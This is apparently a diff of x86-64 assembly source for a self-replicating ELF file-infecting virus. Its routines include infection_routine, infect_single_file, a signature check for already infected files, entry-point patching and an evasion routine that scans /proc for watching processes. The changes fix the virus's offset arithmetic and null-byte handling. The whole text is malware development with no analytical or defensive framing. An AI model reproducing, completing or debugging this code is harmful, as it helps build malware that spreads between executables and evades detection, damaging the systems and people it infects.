@@ -54,7 +54,7 @@ infected:
     ; jmp to original entry
     lea rax, [rel _start]
     mov rdi, qword [rel ent_vaddr_gap]
-    shr rdi , 8 ; NOTE: woah wtf is this? plz explain why 
+    ; shr rdi , 8 ; NOTE: woah wtf is this? plz explain why 
     
     sub rax, rdi
     jmp rax
@@ -73,11 +73,6 @@ mother:
     lea rdi, [rel root_dirs]
     call infection_routine
     jmp exit_ok
-
-    ; lea r8, [rel _end] ; end addr
-    ; lea r9, [rel _start]; start addr
-    ; sub r8, r9 ; r8 = end - start
-    
 
 ; evasion routine, this is run to detect if certain
 ; processes are running by scanning the /proc/ directory
@@ -552,12 +547,12 @@ infect_single_file:
 check_infected:
     add rdi, rsi
     mov rsi, rdi ; mmap buffer + entry_offset -> rsi
-    call break ; check arithmetic is OK
 
     lea rdi, [rel signature]
     call strlen
 
     sub rsi, rax
+    sub rsi, 1 ; for the nullbyte
     mov rdx, 5 ; just compare 5 bytes only lah
     call break ; check if values are OK
     call memcmp
@@ -686,7 +681,7 @@ patching_pass:
     lea rax, [rel _start]
     lea rcx, [rel params]
     sub rax, rcx
-    sub rax , 1 ; NOTE: 1 character offset
+    ; sub rax , 1 ; NOTE: 1 character offset
     add rbx, rax ; new entry -> rbx
     
     ; rdi - pheader in question
@@ -826,6 +821,10 @@ write_params:
     lea rsi, [rel signature]
     mov rdi, rdx
     call strcpy
+    
+    ; add extra nullbyte strcpy misses
+    ; mov byte [rax], 0
+    add rax, 1
 
 
 .ret:
